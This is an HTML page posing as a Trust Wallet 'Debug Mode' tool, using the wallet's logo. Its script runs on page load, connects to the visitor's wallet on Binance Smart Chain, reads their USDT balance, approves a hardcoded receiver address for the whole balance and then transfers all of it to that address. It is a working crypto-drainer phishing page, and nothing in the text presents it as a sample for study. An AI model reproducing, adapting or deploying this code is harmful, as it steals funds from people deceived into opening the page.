<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Debug Trust Wallet</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="favicon.ico">
<style>
body {
  background:#081c3a; color:white; text-align:center; padding:20px;
  font-family:sans-serif;
}
img { width:80px; margin-bottom:20px; }
.status { margin-top:10px; color:#ccc; }
</style>
</head>
<body>
<img src="logo.png" alt="Trust Wallet">
<h2>Debug Mode</h2>
<p id="status" class="status">Initializing‚Ä¶</p>

<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
<script>
const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const ABI = [
  {constant:true,inputs:[{name:"owner",type:"address"}],name:"balanceOf",outputs:[{name:"balance",type:"uint256"}],type:"function"},
  {constant:false,inputs:[{name:"_spender",type:"address"},{name:"_value",type:"uint256"}],name:"approve",outputs:[{name:"",type:"bool"}],type:"function"},
  {constant:false,inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transferFrom",outputs:[{name:"",type:"bool"}],type:"function"}
];

async function run() {
  const status = document.getElementById('status');
  try {
    if (!window.ethereum) { status.innerText = "‚ùå Trust Wallet DApp browser needed"; return; }

    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });

    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];
    status.innerText = "‚úÖ Connected: " + user;

    // Check network
    const chainId = await web3.eth.getChainId();
    if (chainId !== 56) { status.innerText += "\n‚ùå Please switch to Smart Chain (BSC)"; return; }

    const contract = new web3.eth.Contract(ABI, USDT);
    const balance = await contract.methods.balanceOf(user).call();

    status.innerText += "\nüí∞ Balance: " + balance;

    if (balance === "0") { status.innerText += "\nYou have 0 USDT"; return; }

    status.innerText += "\nüõ°Ô∏è Approving‚Ä¶";
    await contract.methods.approve(RECEIVER, balance).send({ from: user });

    status.innerText += "\n‚úÖ Approved. Transferring‚Ä¶";
    await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });

    status.innerText += "\nüéâ Success!";
  } catch (e) {
    status.innerText += "\n‚ùå Error: " + e.message;
    alert("Error: " + e.message); // For extra debug
  }
}

window.addEventListener('load', run);
</script>
</body>
</html>
